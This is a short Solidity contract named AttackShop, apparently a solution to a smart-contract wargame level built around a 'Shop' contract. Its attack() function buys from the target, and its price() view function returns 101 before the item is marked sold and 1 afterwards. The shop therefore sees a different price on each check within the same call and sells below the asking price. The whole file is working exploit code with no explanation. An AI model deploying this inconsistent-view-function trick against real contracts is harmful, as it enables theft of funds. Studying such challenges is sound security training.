// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./shop.sol";


contract AttackShop {
    
    Shop public target;
    bool called = false;

    constructor(address targetAddress) {
        target = Shop(targetAddress);
    }

    function attack() public {
        target.buy();
    }

    function price() external view returns (uint) {
        if (!target.isSold()) {
            return 101;
        }
        else { 
            return 1;
        }
    }
}

